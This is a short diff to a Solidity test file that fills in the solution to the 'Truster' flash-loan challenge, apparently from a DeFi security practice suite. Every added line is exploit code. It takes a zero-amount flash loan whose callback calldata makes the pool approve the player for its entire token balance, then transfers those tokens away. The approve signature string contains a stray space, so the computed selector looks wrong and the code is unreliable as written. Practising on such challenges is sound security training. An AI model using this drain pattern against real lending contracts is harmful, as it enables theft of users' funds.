@@ -51,7 +51,9 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        uint amount = token.balanceOf(address(pool));
+        require(pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address, uint256)", address(this), amount)));
+        require(token.transferFrom(address(pool), recovery, amount));
     }
 
     /**
